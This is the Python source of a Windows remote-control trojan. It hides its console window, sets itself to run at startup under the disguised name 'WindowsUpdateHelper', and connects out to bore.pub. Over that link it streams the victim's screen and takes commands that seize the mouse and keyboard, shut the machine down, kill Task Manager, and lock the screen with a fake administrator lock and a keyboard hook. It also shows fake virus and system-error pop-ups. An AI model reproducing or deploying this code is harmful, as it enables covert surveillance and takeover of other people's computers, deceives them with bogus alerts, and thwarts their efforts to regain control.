import socket
import threading
import pyautogui
pyautogui.FAILSAFE = False
from pynput.keyboard import Controller, Key
import time
import sys
import os
import psutil
import subprocess
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

SECRET = "gH7#kL9$mN2@pQ5!rT8&vB4*wZ1"

class RemoteControlServer:
    def __init__(self):
        self.running = False
        self.reverse_mouse = False
        self.keyboard_controller = Controller()
        self.keyboard_capture_active = False
        self.block_taskmgr = False
        self.locked = False
        self.lock_window = None
        self.autoclick_active = False
        self.automove_active = False
        self._kb_hook = None
        self.error_spam_running = False
        self.error_spam_root = None

    def hide_console(self):
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    def add_to_startup(self):
        try:
            import winreg
            exe = os.path.abspath(sys.argv[0])
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, exe)
            winreg.CloseKey(key)
        except:
            pass

    def start(self):
        self.add_to_startup()
        self.running = True

        threading.Thread(target=self.monitor_task_manager, daemon=True).start()

        while self.running:
            conn = self.find_bore_port()
            if conn:
                threading.Thread(target=self.stream_screens, args=(conn,), daemon=True).start()
                self.handle_client(conn)
            time.sleep(10)

    def find_bore_port(self):
        def try_port(p):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            try:
                s.connect(('bore.pub', p))
                s.sendall(f"AUTH {SECRET}\n".encode())
                s.settimeout(5)
                resp = s.recv(1024)
                if resp.strip() == b"AUTH_OK":
                    s.settimeout(None)
                    return s
            except: pass
            s.close()
            return None

        with ThreadPoolExecutor(max_workers=20) as ex:
            futs = [ex.submit(try_port, p) for p in range(65535, 64999, -1)]
            for f in as_completed(futs):
                r = f.result()
                if r:
                    return r
        return None

    def stop(self):
        self.running = False

    def stream_screens(self, client_socket):
        from PIL import Image
        import io
        while self.running:
            try:
                img = pyautogui.screenshot()
                img = img.resize((1280, 720), Image.LANCZOS)
                buf = io.BytesIO()
                img.save(buf, format='JPEG', quality=25, optimize=True)
                data = buf.getvalue()
                client_socket.sendall(len(data).to_bytes(4, 'big') + data)
                time.sleep(0.05)
            except:
                break

    def handle_client(self, client_socket):
        threading.Thread(target=self.stream_screens, args=(client_socket,), daemon=True).start()
        try:
            while self.running:
                command = client_socket.recv(4096).decode().strip()
                if not command:
                    break
                self.process_command(command)
        except ConnectionResetError:
            print("Client disconnected")
        except Exception as e:
            print(f"Client error: {e}")
        finally:
            client_socket.close()
            print("Client connection closed")

    def bg(self, target, args=()):
        threading.Thread(target=target, args=args, daemon=True).start()

    def process_command(self, command):
        try:
            parts = command.split()
            cmd = parts[0].lower()

            if cmd == "move" and len(parts) == 3:
                x, y = map(int, parts[1:3])
                pyautogui.moveRel(x, y)

            elif cmd == "click" and len(parts) == 2:
                pyautogui.click(button=parts[1].lower())

            elif cmd == "click_at" and len(parts) == 3:
                x, y = int(parts[1]), int(parts[2])
                pyautogui.moveTo(x, y)
                pyautogui.click()

            elif cmd == "automove":
                self.bg(self._automove, (parts,))

            elif cmd == "autoclick":
                self.bg(self._autoclick, (parts,))

            elif cmd == "rick":
                self.bg(self.play_rick_roll)

            elif cmd == "fake_virus":
                self.bg(self.show_fake_virus)

            elif cmd == "shutdown":
                os.system("shutdown /s /t 1")

            elif cmd == "fake_error":
                self.bg(self.show_fake_error)

            elif cmd == "error_spam":
                self.bg(self.run_error_spam)

            elif cmd == "error_spam_stop":
                self.stop_error_spam()

            elif cmd == "reverse_mouse":
                self.reverse_mouse = not self.reverse_mouse

            elif cmd == "type":
                self.keyboard_controller.type(' '.join(parts[1:]))

            elif cmd == "open" and len(parts) > 1:
                self.bg(self._open_url, (parts,))

            elif cmd == "key" and len(parts) > 1:
                self.press_key(parts[1])

            elif cmd == "special_key" and len(parts) > 1:
                self.press_special_key(parts[1])

            elif cmd == "block_taskmgr":
                self.block_taskmgr = not self.block_taskmgr

            elif cmd == "lock_screen":
                self.bg(self.lock_screen)

            elif cmd == "unlock":
                self.bg(self.unlock_screen)

            elif cmd == "exit":
                self.running = False

        except Exception as e:
            print(f"Command error: {e}")

    def _automove(self, parts):
        if self.automove_active:
            return
        self.automove_active = True
        try:
            speed = 0.5 if len(parts) < 2 else float(parts[1])
            pyautogui.moveRel(100, 0, duration=speed)
            pyautogui.moveRel(0, 100, duration=speed)
            pyautogui.moveRel(-100, 0, duration=speed)
            pyautogui.moveRel(0, -100, duration=speed)
        finally:
            self.automove_active = False

    def _autoclick(self, parts):
        if self.autoclick_active:
            return
        self.autoclick_active = True
        try:
            interval = 1.0 if len(parts) < 2 else float(parts[1])
            duration = float(parts[2]) if len(parts) > 2 else 10.0
            end = time.time() + duration
            while time.time() < end and self.running:
                pyautogui.click()
                time.sleep(interval)
        finally:
            self.autoclick_active = False

    def _open_url(self, parts):
        import webbrowser
        webbrowser.open(' '.join(parts[1:]))

    def lock_screen(self):
        self.locked = True
        try:
            import ctypes
            from ctypes import wintypes
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            HOOKPROC = ctypes.WINFUNCTYPE(wintypes.LPARAM, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
            def proc(nCode, wParam, lParam):
                if nCode >= 0:
                    return 1
                return user32.CallNextHookEx(None, nCode, wParam, lParam)
            self._kb_hook_proc = HOOKPROC(proc)
            self._kb_hook = user32.SetWindowsHookExW(13, self._kb_hook_proc, kernel32.GetModuleHandleW(None), 0)
        except:
            pass
        try:
            import tkinter as tk
            import ctypes
            user32 = ctypes.windll.user32
            vx = user32.GetSystemMetrics(76)
            vy = user32.GetSystemMetrics(77)
            vw = user32.GetSystemMetrics(78)
            vh = user32.GetSystemMetrics(79)
            win = tk.Tk()
            win.overrideredirect(True)
            win.geometry(f"{vw}x{vh}+{vx}+{vy}")
            win.attributes('-topmost', True)
            win.configure(bg='#0078d7')
            win.focus_force()
            win.lift()
            win.grab_set()
            frame = tk.Frame(win, bg='#0078d7')
            frame.pack(expand=True, fill='both')
            tk.Label(frame, text="Windows Locked", fg='white', bg='#0078d7',
                     font=('Segoe UI', 48, 'bold')).pack(pady=(150, 20))
            tk.Label(frame, text="This computer has been locked by the system administrator.", fg='#cce5ff', bg='#0078d7',
                     font=('Segoe UI', 16)).pack(pady=10)
            tk.Label(frame, text="Enter password to unlock", fg='#cce5ff', bg='#0078d7',
                     font=('Segoe UI', 14)).pack(pady=30)
            pw_frame = tk.Frame(frame, bg='#0078d7')
            pw_frame.pack()
            tk.Label(pw_frame, text="Password:", fg='white', bg='#0078d7',
                     font=('Segoe UI', 14)).pack(side='left', padx=10)
            pw = tk.Entry(pw_frame, show='*', font=('Segoe UI', 14), width=20)
            pw.pack(side='left')
            pw.focus_force()
            self.lock_window = win
            win.mainloop()
        except Exception as e:
            print(f"Lock screen error: {e}")

    def unlock_screen(self):
        self.locked = False
        if self.lock_window:
            try:
                self.lock_window.grab_release()
                self.lock_window.after(0, self.lock_window.destroy)
            except:
                pass
            self.lock_window = None
        try:
            if self._kb_hook:
                ctypes.windll.user32.UnhookWindowsHookEx(self._kb_hook)
                self._kb_hook = None
        except:
            pass

    def kill_task_manager(self):
        try:
            import psutil
            for proc in psutil.process_iter(['name', 'pid']):
                try:
                    if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
                        proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        except:
            pass
        import subprocess
        subprocess.run(['taskkill', '/f', '/im', 'Taskmgr.exe'], capture_output=True, shell=True)
        try:
            import ctypes
            from ctypes import wintypes
            user32 = ctypes.windll.user32
            enum_proc = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
            def callback(hwnd, lparam):
                titles = ('Task Manager', 'Диспетчер задач', 'TaskManagerWindow')
                buf = ctypes.create_unicode_buffer(256)
                user32.GetWindowTextW(hwnd, buf, 256)
                for t in titles:
                    if t in buf.value:
                        user32.PostMessageW(hwnd, 0x0010, 0, 0)
                        break
                cls = ctypes.create_unicode_buffer(64)
                user32.GetClassNameW(hwnd, cls, 64)
                if 'TaskManager' in cls.value:
                    user32.PostMessageW(hwnd, 0x0010, 0, 0)
                return True
            user32.EnumWindows(enum_proc(callback), 0)
        except:
            pass

    def monitor_task_manager(self):
        while self.running:
            if self.block_taskmgr:
                self.kill_task_manager()
            time.sleep(0.3)

    def press_key(self, key):
        try:
            self.keyboard_controller.press(key)
            time.sleep(0.05)
            self.keyboard_controller.release(key)
        except Exception as e:
            print(f"Error pressing key {key}: {e}")

    def press_special_key(self, key_name):
        try:
            special_keys = {
                'ctrl': Key.ctrl, 'shift': Key.shift, 'alt': Key.alt,
                'enter': Key.enter, 'esc': Key.esc, 'space': Key.space,
                'tab': Key.tab, 'backspace': Key.backspace, 'delete': Key.delete,
                'up': Key.up, 'down': Key.down, 'left': Key.left, 'right': Key.right
            }
            key = special_keys.get(key_name.lower())
            if key:
                self.keyboard_controller.press(key)
                time.sleep(0.05)
                self.keyboard_controller.release(key)
        except Exception as e:
            print(f"Error pressing special key {key_name}: {e}")

    def send_screenshot(self):
        try:
            from PIL import Image
            import io, zlib
            img = pyautogui.screenshot()
            buf = io.BytesIO()
            img.save(buf, format='JPEG', quality=70, optimize=True)
            compressed = zlib.compress(buf.getvalue())
            size = len(compressed)
            return size.to_bytes(4, 'big') + compressed
        except Exception as e:
            print(f"Error sending screenshot: {e}")
            return "Error"

    def play_rick_roll(self):
        try:
            os.system('start https://www.youtube.com/watch?v=dQw4w9WgXcQ')
        except:
            pass

    def show_fake_virus(self):
        try:
            import tkinter as tk
            win = tk.Tk()
            win.title("Virus Alert")
            win.geometry("500x300+{}+{}".format(
                (win.winfo_screenwidth()-500)//2, (win.winfo_screenheight()-300)//2))
            win.configure(bg='#1a0000')
            win.attributes('-topmost', True)
            win.focus_force()
            win.lift()
            tk.Label(win, text="⚠ CRITICAL ERROR ⚠", fg='#ff0000', bg='#1a0000',
                     font=('Arial', 28, 'bold')).pack(pady=30)
            tk.Label(win, text="Your computer has been infected!\nAll files will be encrypted.",
                     fg='#ff6666', bg='#1a0000', font=('Arial', 14)).pack(pady=10)
            tk.Button(win, text="OK", command=win.destroy, bg='#330000',
                      fg='#fff', font=('Arial', 12)).pack(pady=20)
            win.mainloop()
        except:
            pass

    def show_fake_error(self):
        try:
            import tkinter as tk
            win = tk.Tk()
            win.title("System Error")
            win.geometry("480x250+{}+{}".format(
                (win.winfo_screenwidth()-480)//2, (win.winfo_screenheight()-250)//2))
            win.configure(bg='#000033')
            win.attributes('-topmost', True)
            win.focus_force()
            win.lift()
            tk.Label(win, text="SYSTEM CRITICAL ERROR", fg='#4488ff', bg='#000033',
                     font=('Arial', 22, 'bold')).pack(pady=30)
            tk.Label(win, text="Windows has encountered a critical error!\nError code: 0x80070002\n\n"
                     "The system will shut down automatically.",
                     fg='#88bbff', bg='#000033', font=('Arial', 13)).pack(pady=10)
            tk.Button(win, text="Close", command=win.destroy, bg='#001133',
                      fg='#fff', font=('Arial', 12)).pack(pady=20)
            win.mainloop()
        except:
            pass

    def run_error_spam(self):
        if self.error_spam_running:
            return
        self.error_spam_running = True
        try:
            import tkinter as tk, time, random, ctypes
            ERRORS = [
                ("Ошибка системы", "Обнаружено нарушение целостности системных файлов.\nSTOP CODE: CRITICAL_PROCESS_DIED"),
                ("Сбой приложения", "explorer.exe перестал работать.\nWindows собирает сведения об ошибке..."),
                ("Предупреждение безопасности", "Обнаружен нежелательный доступ к реестру.\nИсточник: UNKNOWN_PROCESS.exe"),
                ("Нехватка памяти", "Недостаточно памяти для завершения операции.\nДоступно: 0 МБ"),
                ("Ошибка активации Windows", "Оставшееся время: 3 дня."),
                ("Антивирус — Угроза найдена", "Обнаружен вирус!\nФАЙЛ: downloads\\crack.exe\nУГРОЗА: Trojan.Win32.Generic"),
                ("Перегрев процессора", "Температура CPU достигла 103°C!"),
                ("Обнаружена слежка", "Программа запросила доступ к камере.\nПРОЦЕСС: svchost.exe"),
                ("Ошибка драйвера", "Драйвер NVIDIA застрял в бесконечном цикле.\nDRIVER_IRQL_NOT_LESS_OR_EQUAL"),
                ("КРИТИЧЕСКАЯ ОШИБКА", "Все несохранённые данные будут потеряны.\nERROR: 0xDEADBEEF"),
            ]
            def make_err(title, text):
                win = tk.Toplevel(root)
                win.title(title)
                win.resizable(False, False)
                win.configure(bg='#f0f0f0')
                win.attributes('-topmost', True)
                tk.Frame(win, bg='#c42b1c', height=4).pack(fill='x')
                body = tk.Frame(win, bg='#f0f0f0', padx=20, pady=14)
                body.pack(fill='both', expand=True)
                row = tk.Frame(body, bg='#f0f0f0')
                row.pack(fill='x', pady=(0, 12))
                tk.Label(row, text='🛑', font=('Segoe UI Emoji', 28), bg='#f0f0f0').pack(side='left', padx=(0, 14))
                info = tk.Frame(row, bg='#f0f0f0')
                info.pack(side='left', fill='x', expand=True)
                tk.Label(info, text=title, font=('Segoe UI', 10, 'bold'), bg='#f0f0f0', fg='#c42b1c', wraplength=300, anchor='w').pack(fill='x')
                tk.Label(info, text=text, font=('Segoe UI', 9), bg='#f0f0f0', fg='#1a1a1a', wraplength=300, justify='left').pack(fill='x', pady=(4, 0))
                tk.Frame(body, bg='#d0d0d0', height=1).pack(fill='x', pady=(8, 8))
                btnr = tk.Frame(body, bg='#f0f0f0')
                btnr.pack(anchor='e')
                tk.Button(btnr, text='OK', font=('Segoe UI', 9), width=12, bg='#0078d4', fg='white', relief='flat', command=win.destroy).pack(side='left', padx=4)
                win.update_idletasks()
                sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
                win.geometry(f'+{random.randint(30, max(31, sw - win.winfo_reqwidth() - 30))}+{random.randint(30, max(31, sh - win.winfo_reqheight() - 60))}')
                try:
                    hwnd = int(win.wm_frame(), 16)
                    ctypes.windll.user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, 0x0002 | 0x0001)
                    ctypes.windll.user32.SetForegroundWindow(hwnd)
                except: pass
            def spam():
                if not self.error_spam_running:
                    root.quit(); return
                make_err(*random.choice(ERRORS))
                root.after(random.randint(5000, 15000), spam)
            root = tk.Tk()
            root.withdraw()
            self.error_spam_root = root
            root.after(1000, spam)
            root.mainloop()
        except: pass
        finally:
            self.error_spam_running = False
            self.error_spam_root = None

    def stop_error_spam(self):
        self.error_spam_running = False
        if self.error_spam_root:
            try:
                self.error_spam_root.quit()
                self.error_spam_root.destroy()
            except: pass
            self.error_spam_root = None

if __name__ == "__main__":
    try:
        from pynput.keyboard import Controller
        import psutil
    except ImportError as e:
        print(f"Error: Required library not found - {e}")
        print("Please install with: pip install pyautogui pynput psutil")
        sys.exit(1)

    server = RemoteControlServer()
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()
